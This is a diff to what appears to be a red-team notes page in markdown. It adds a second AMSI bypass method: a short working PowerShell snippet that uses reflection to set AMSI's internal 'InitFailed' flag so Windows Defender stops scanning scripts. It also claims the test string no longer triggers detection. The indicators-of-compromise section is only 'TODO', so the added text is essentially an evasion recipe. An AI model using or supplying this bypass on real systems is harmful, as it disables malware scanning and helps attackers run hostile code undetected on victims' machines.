@@ -36,3 +36,23 @@ Now the 'amsiutils' test string should not trigger defender:
 #### Indicators of Compromise
 
 TODO
+
+### Method 2 - Telling AMSI that init Failed
+
+Similar to method 1, only powershell is needed for this technique. Instead of corrupting the AMSI context pointer, it's possible to convince AMSI that it's initialization failed.
+
+Use the following powershell to bypass AMSI:
+
+```powershell
+foreach($x in [Ref].Assembly.GetTypes()){if($x.Name -like '*iUtils'){$a=$x}}
+foreach($x in $a.GetFields('NonPublic,Static')){if($x.Name -like '*iInitFailed'){$i=$x}}
+$i.SetValue($null, $true)
+```
+
+Now the 'amsiutils' test string should not trigger defender:
+
+![[Pasted image 20230707133543.png]]
+
+#### Indicators of Compromise
+
+TODO
